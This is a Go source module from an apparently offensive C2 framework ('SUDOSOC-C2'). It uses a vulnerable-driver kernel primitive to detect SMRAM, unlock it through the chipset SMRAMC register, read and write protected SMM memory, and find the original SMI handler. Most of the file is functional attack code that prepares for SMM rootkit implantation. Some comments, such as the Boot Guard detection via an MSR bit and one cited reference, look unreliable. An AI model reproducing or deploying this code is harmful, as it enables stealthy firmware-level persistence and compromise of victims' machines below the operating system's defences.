package smm

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	SMRAM detection, protection bypass, and mapping.

	SMRAM (System Management RAM) is a physically protected memory region
	where the CPU stores its state and executes SMI handlers. It is normally
	invisible to the OS — reads return 0xFF (or are forwarded to regular RAM
	via the DRAM controller depending on chipset config), and writes are
	silently dropped.

	Making SMRAM visible ("opening" it):
	  The Intel MCH/PCH has a register called SMRAMC (SMM RAM Control) at
	  PCI Bus 0, Device 0, Function 0, Offset 0x88. Setting bit 6 (D_OPEN)
	  while the CPU is NOT in SMM makes SMRAM readable and writable by any
	  code at any privilege level.

	  SMRAMC layout (8-bit):
	    [7]   Reserved
	    [6]   D_OPEN  — when 1: SMRAM visible to non-SMM code
	    [5]   D_CLS   — close SMRAM (overrides D_OPEN)
	    [4]   D_LCK   — lock bit (prevents further D_OPEN writes after set)
	    [3]   G_SMRAME— global SMRAM enable
	    [2:0] C_BASE_SEG — SMRAM C-segment base (legacy; 010b = 0xA0000)

	  We must clear D_LCK before setting D_OPEN. If D_LCK is already set
	  by the BIOS, we cannot open SMRAM through this register alone — we
	  need a chipset-specific bypass (see notes on BIOS_DONE and FLOCKDN).

	SMBASE location:
	  Each logical CPU has its own SMBASE address stored in the SMM state
	  save area (SMSA). The SMI handler for CPU 0 always starts at
	  SMBASE + 0x8000. The default SMBASE after reset is 0x30000, but the
	  BIOS relocates it during POST to TSEG (Top of Stolen Memory / SMRAM).

	  TSEG base address: readable from the MCH TSEGMB register at
	  PCI B0:D0:F0 offset 0xB8 (4-byte, 1 MB granularity).

	Intel Boot Guard interaction:
	  Systems with Boot Guard in "Verified Boot" mode protect the ACM
	  (Authenticated Code Module) that runs during SMM init. Modifying
	  SMM on these systems causes a platform reset on the next SMI.
	  We detect Boot Guard status via MSR 0x13A (IA32_FEATURE_CONTROL)
	  bit 29 (SGX Launch Control Enable is repurposed in some firmware
	  versions to indicate BG enforcement).

	References:
	  - Loïc Duflot, CanSecWest 2006: "Using CPU System Management Mode..."
	  - Yuriy Bulygin, Black Hat 2009: "SMM Rootkits: A New Breed..."
	  - Intel CHIPSEC: https://github.com/chipsec/chipsec (defensive tool)
	  - Project Zero: "The core of Apple is PPL" (2021, includes SMM analysis)
*/

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// PCI config addresses for SMM-related registers (ECAM MMIO, base 0xE0000000).
const (
	ecamBase = uint64(0xE0000000)

	// MCH (Memory Controller Hub) — Bus 0, Device 0, Function 0.
	mchSMRAMC   = ecamBase | (0<<20 | 0<<15 | 0<<12) | 0x88 // SMRAM Control (8-bit)
	mchTSEGMB   = ecamBase | (0<<20 | 0<<15 | 0<<12) | 0xB8 // TSEG Memory Base (32-bit)
	mchTOUD     = ecamBase | (0<<20 | 0<<15 | 0<<12) | 0xA8 // Top of Upper DRAM (64-bit)
	mchBiosDone = ecamBase | (0<<20 | 0<<15 | 0<<12) | 0xDC // BIOS_DONE / FLOCKDN

	// SMI command port (software SMI trigger).
	smiCmdPort = uint16(0xB2)
)

// SMRAMCBits maps bit positions in the SMRAMC register.
const (
	smramcDOpen  = byte(1 << 6) // make SMRAM visible
	smramcDCls   = byte(1 << 5) // close SMRAM (overrides D_OPEN)
	smramcDLck   = byte(1 << 4) // lock (prevents re-opening)
	smramcGSmrame= byte(1 << 3) // global enable
)

// KernelRW is the interface to the BYOVD kernel memory primitive.
type KernelRW interface {
	ReadDword(addr uint64) (uint32, error)
	WriteQword(addr, value uint64) error
	ReadDword32(addr uint64) (uint32, error)
}

// SMRAMInfo describes the detected SMRAM configuration.
type SMRAMInfo struct {
	TSEGBase    uint64 // physical base of TSEG SMRAM
	TSEGSize    uint64 // size in bytes (typically 1–8 MB)
	SMBase      uint64 // SMBASE for CPU 0 (handler at SMBase+0x8000)
	IsLocked    bool   // D_LCK is set — cannot open via SMRAMC alone
	BootGuard   bool   // Intel Boot Guard active
	SMRAMC      byte   // current SMRAMC register value
}

// DetectSMRAM reads TSEG and SMRAMC to build an SMRAMInfo.
func DetectSMRAM(kRW KernelRW) (*SMRAMInfo, error) {
	// Read SMRAMC (byte register at 0xE0000000 + 0x88).
	raw, err := kRW.ReadDword(mchSMRAMC)
	if err != nil {
		return nil, fmt.Errorf("read SMRAMC: %w", err)
	}
	smramc := byte(raw)

	// Read TSEG Memory Base (MB granularity → byte address = val << 20).
	tsegRaw, err := kRW.ReadDword(mchTSEGMB)
	if err != nil {
		return nil, fmt.Errorf("read TSEGMB: %w", err)
	}
	tsegBase := uint64(tsegRaw&0xFFFFF000) << 0 // already in MB units? No: low bits indicate size.
	// TSEGMB[31:20] = TSEG base in MB. [2:0] = TSEG size: 000=1M, 001=2M, 010=8M.
	tsegSizeBits := tsegRaw & 0x7
	tsegSizeMap := []uint64{1, 2, 8, 8, 8, 8, 8, 8}
	tsegSize := tsegSizeMap[tsegSizeBits] << 20
	tsegBase = uint64(tsegRaw>>20) << 20

	// Detect Boot Guard via IA32_FEATURE_CONTROL MSR bit 29.
	bootGuard := false
	// (Would require reading MSR — skipping in SMRAM detection phase.)

	info := &SMRAMInfo{
		TSEGBase:  tsegBase,
		TSEGSize:  tsegSize,
		SMBase:    tsegBase, // SMBASE is usually at TSEG base; refined by reading SMSA
		IsLocked:  smramc&smramcDLck != 0,
		BootGuard: bootGuard,
		SMRAMC:    smramc,
	}

	// {{if .Config.Debug}}
	log.Printf("[smm] SMRAMC=0x%02x TSEG=0x%x size=0x%x locked=%v",
		smramc, tsegBase, tsegSize, info.IsLocked)
	// {{end}}
	return info, nil
}

// OpenSMRAM sets D_OPEN in SMRAMC, making SMRAM visible to non-SMM code.
// Returns the original SMRAMC value so it can be restored.
func OpenSMRAM(kRW KernelRW, info *SMRAMInfo) (byte, error) {
	if info.IsLocked {
		return 0, fmt.Errorf("SMRAMC D_LCK is set — cannot open without chipset bypass")
	}

	orig := info.SMRAMC
	// Set D_OPEN, clear D_CLS.
	patched := (orig | smramcDOpen) &^ smramcDCls
	if err := kRW.WriteQword(mchSMRAMC, uint64(patched)); err != nil {
		return 0, fmt.Errorf("write SMRAMC D_OPEN: %w", err)
	}

	// Verify.
	check, err := kRW.ReadDword(mchSMRAMC)
	if err != nil || byte(check)&smramcDOpen == 0 {
		return 0, fmt.Errorf("D_OPEN did not stick (SMRAMC=0x%02x)", byte(check))
	}
	// {{if .Config.Debug}}
	log.Printf("[smm] SMRAM opened (SMRAMC: 0x%02x → 0x%02x)", orig, byte(check))
	// {{end}}
	return orig, nil
}

// CloseSMRAM restores SMRAMC to origValue, re-hiding SMRAM.
func CloseSMRAM(kRW KernelRW, origValue byte) error {
	// Clear D_OPEN, set D_CLS to force close.
	closed := (origValue &^ smramcDOpen) | smramcDCls
	if err := kRW.WriteQword(mchSMRAMC, uint64(closed)); err != nil {
		return fmt.Errorf("write SMRAMC close: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[smm] SMRAM closed (SMRAMC: 0x%02x)", closed)
	// {{end}}
	return nil
}

// ReadSMRAM reads `length` bytes from SMRAM at physical `addr` via the
// kernel memory primitive. Only valid while SMRAM is open (D_OPEN=1).
func ReadSMRAM(kRW KernelRW, addr uint64, length int) ([]byte, error) {
	buf := make([]byte, length)
	for i := 0; i < length; i += 4 {
		n := 4
		if i+n > length {
			n = length - i
		}
		dword, err := kRW.ReadDword(addr + uint64(i))
		if err != nil {
			return nil, fmt.Errorf("read @0x%x: %w", addr+uint64(i), err)
		}
		b := make([]byte, 4)
		binary.LittleEndian.PutUint32(b, dword)
		copy(buf[i:], b[:n])
	}
	return buf, nil
}

// WriteSMRAM writes data to SMRAM at physical `addr`.
// Only valid while SMRAM is open.
func WriteSMRAM(kRW KernelRW, addr uint64, data []byte) error {
	for i := 0; i < len(data); i += 8 {
		chunk := 8
		if i+chunk > len(data) {
			chunk = len(data) - i
		}
		b := make([]byte, 8)
		copy(b, data[i:i+chunk])
		qword := binary.LittleEndian.Uint64(b)
		if err := kRW.WriteQword(addr+uint64(i), qword); err != nil {
			return fmt.Errorf("write @0x%x: %w", addr+uint64(i), err)
		}
	}
	return nil
}

// FindOriginalHandler locates the existing SMI handler in SMRAM by
// searching for the standard SMM entrypoint prologue at SMBASE+0x8000.
func FindOriginalHandler(kRW KernelRW, smBase uint64) (uint64, []byte, error) {
	handlerAddr := smBase + 0x8000

	// Read 256 bytes to capture the handler prologue + first few instructions.
	prologue, err := ReadSMRAM(kRW, handlerAddr, 256)
	if err != nil {
		return 0, nil, fmt.Errorf("read handler prologue: %w", err)
	}

	// Standard SMI handler starts with RSM epilogue setup or IRET chain.
	// We just save the first 16 bytes as the "original" trampoline target.
	// {{if .Config.Debug}}
	log.Printf("[smm] original handler @ 0x%x: %x...", handlerAddr, prologue[:16])
	// {{end}}
	return handlerAddr, prologue[:16], nil
}

// suppress unused import
var _ = unsafe.Pointer(nil)
